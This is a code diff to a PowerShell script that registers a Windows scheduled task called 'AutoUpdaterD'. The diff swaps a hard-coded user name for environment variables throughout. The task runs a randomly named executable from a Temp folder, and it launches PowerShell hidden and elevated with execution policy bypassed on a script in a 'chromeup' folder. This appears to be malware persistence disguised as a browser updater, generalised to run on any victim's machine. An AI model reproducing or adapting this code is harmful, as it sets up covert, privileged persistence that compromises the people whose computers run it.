@@ -42,7 +42,7 @@ $taskXml = @"
 <Task version="1.4" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
   <RegistrationInfo>
     <Date>2023-08-09T11:59:58.6674267</Date>
-    <Author>BTO-JOB\jbkal</Author>
+    <Author>$env:computername\$env:username</Author>
     <URI>\AutoUpdaterD</URI>
   </RegistrationInfo>
   <Triggers>
@@ -88,11 +88,11 @@ $taskXml = @"
   </Settings>
   <Actions Context="Author">
     <Exec>
-      <Command>C:\Users\jbkal\AppData\Local\Temp\sVBXKuz\wsappa.exe</Command>
+      <Command>C:\Users\$env:username\AppData\Local\Temp\sVBXKuz\wsappa.exe</Command>
     </Exec>
     <Exec>
       <Command>powershell.exe</Command>
-      <Arguments>/c Start-Process powershell.exe -ArgumentList '-ExecutionPolicy','Bypass','-File', C:\Users\jbkal\AppData\Roaming\chromeup\backup.ps1 -Verb runAs -WindowStyle Hidden</Arguments>
+      <Arguments>/c Start-Process powershell.exe -ArgumentList '-ExecutionPolicy','Bypass','-File', $env:appdata\chromeup\backup.ps1 -Verb runAs -WindowStyle Hidden</Arguments>
     </Exec>
   </Actions>
 </Task>
